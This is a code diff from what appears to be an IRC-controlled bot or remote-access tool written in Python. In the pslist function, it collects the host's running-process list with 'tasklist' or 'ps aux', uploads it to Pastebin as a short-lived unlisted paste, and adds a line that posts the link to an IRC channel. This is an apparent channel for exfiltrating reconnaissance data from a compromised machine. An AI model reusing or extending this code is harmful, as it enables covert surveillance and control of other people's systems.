@@ -79,17 +79,19 @@ def get_external_ip(): # Function to get external ip address
 def pslist(): # Function to list process names and pids
   x = PastebinAPI()
   if (str(platform.platform()))[0:3]=="Win":
-    # TODO: Make this pretty
-    paste_code = os.Popen('tasklist').read()
+    # TODO: make this pretty
+    p = subprocess.Popen('tasklist', shell=False, stdout=subprocess.PIPE)
+    p.wait()
+    paste_code = p.stdout.read()
     url = x.paste(pastebin_api_key,
                   paste_code,
                   paste_name = 'tasklist', 
                   paste_private = 'unlisted',
                   paste_expire_date = '10M')
+    sendmsg(channel, url)
   else:
     p = subprocess.Popen(['ps', 'aux'], shell=False, stdout=subprocess.PIPE)
     p.wait()
-    # TODO: Make this pretty
     paste_code = p.stdout.read()
     url = x.paste(pastebin_api_key,
                   paste_code,
